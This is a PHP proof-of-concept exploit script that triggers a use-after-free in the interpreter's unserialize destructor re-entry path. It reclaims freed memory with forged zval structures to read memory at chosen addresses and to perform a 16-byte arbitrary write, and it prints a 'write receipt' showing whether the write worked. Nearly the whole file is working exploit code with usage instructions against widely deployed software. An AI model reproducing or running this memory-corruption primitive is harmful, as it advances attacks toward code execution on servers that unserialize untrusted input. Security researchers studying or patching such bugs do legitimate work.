<?php
// vdR2: 16-BYTE ARBITRARY WRITE from the vd3 var_destroy re-entry UAF.
//
// R-rule ZVAL_NEW_REF(rval_ref, rval_ref) writes at rval_ref = the forged P:
//   *(uint64*)P    = heap pointer of a fresh zend_reference  (engine-chosen)
//   *(uint32*)(P+8) = IS_REFERENCE_EX (0x30A)
// Demo: P2 = W (chosen target, harmless dtor-block tail). Oracle-read W
// before (R:1020) and after (R:1022) the write (R:1021).
//
// usage: php vdR2_write.php <chunk> <base> <dtorblock>   (16-digit fixed width)
$CHUNK = (int)($argv[1] ?? 0);
$BASE  = (int)($argv[2] ?? 0);
$DTOR  = (int)($argv[3] ?? 0);

class D {
    public function __destruct() {
        global $CHUNK, $BASE, $DTOR;
        $W = $DTOR + 4000;              // write target: unused tail of live var_dtor_entries block
        $P1 = $CHUNK + 24 + 24;         // &fzA (oracle before)
        $P3 = $CHUNK + 24 + 56;         // &fzB (oracle after)
        $pat  = pack('PP', $P1, $W);    // val[0..8]=&fzA, val[8..16]=W (WRITE TARGET)
        $pat .= pack('P', $P3);         // val[16..24]=&fzB
        $pat .= pack('PVV', $W - 16, 6, 0);   // fzA @24: fake zval {str=W-16} -> strlen = *W
        $pat .= str_repeat("\x00", 16); // val[40..56]
        $pat .= pack('PVV', $W - 16, 6, 0);   // fzB @56
        $pat .= str_repeat("\x00", 8);        // 72..80
        $s = str_repeat($pat, 102);           // 8160-byte reclaim
        $r1 = @unserialize('R:1020;');        // read *W (before)
        $before = strlen($r1);
        echo "WRITE-TARGET 0x", dechex($W), " BEFORE = 0x", dechex($before), "\n";
        $r2 = @unserialize('R:1021;');        // ZVAL_NEW_REF writes 16 bytes at W
        $r3 = @unserialize('R:1022;');        // read *W (after)
        $after = strlen($r3);
        echo "WRITE-TARGET 0x", dechex($W), " AFTER  = 0x", dechex($after),
             "  (zend_reference* heap ptr; type_info@W+8 -> 0x30A)\n";
        if ($before != $after) { echo "WRITE RECEIPT: *W changed\n"; }
        else { echo "WRITE FAILED: no change\n"; }
    }
}
$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=";
var_dump($r !== false);
echo "SURVIVED\n";
